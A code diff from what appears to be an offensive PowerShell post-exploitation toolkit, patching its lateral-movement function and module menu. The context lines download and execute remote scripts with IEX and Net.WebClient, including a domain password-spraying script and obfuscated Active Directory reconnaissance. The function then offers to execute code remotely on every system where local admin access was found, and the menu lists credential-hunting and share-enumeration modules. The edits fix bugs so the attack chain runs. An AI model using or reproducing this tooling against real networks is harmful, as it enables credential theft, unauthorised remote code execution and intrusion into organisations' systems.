@@ -1443,8 +1443,8 @@ function latmov
     $currentPath = (Get-Item -Path ".\" -Verbose).FullName
     IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/DomainPasswordSpray.ps1')
     IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/view.ps1')
-    $domain_Name = Get-NetDomain
-    $Domain = $domain_Name.Name
+    $Domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().Name
+    
     
     Write-Host -ForegroundColor Yellow 'Starting Lateral Movement Phase:'
 
@@ -1453,7 +1453,7 @@ function latmov
     fuller >> $currentPath\Exploitation\LocalAdminAccess.txt
 
     $exploitdecision = Read-Host -Prompt 'Do you want to execite code remotely on all found Systems? (yes/no)'
-    elseif ($exploitdecision -eq "yes" -or $exploitdecision -eq "y")
+    if ($exploitdecision -eq "yes" -or $exploitdecision -eq "y")
     {
         launcher
     }
@@ -1994,7 +1994,7 @@ __        ___       ____
             15{passhunt}
             16{reconAD}
             17{fruit}
-            18{sharenumeration}
+            18{shareenumeration}
 	    19{sharpcradle -allthosedotnet $true}
 	    20{sharpcradle}
             21{GPOAudit}
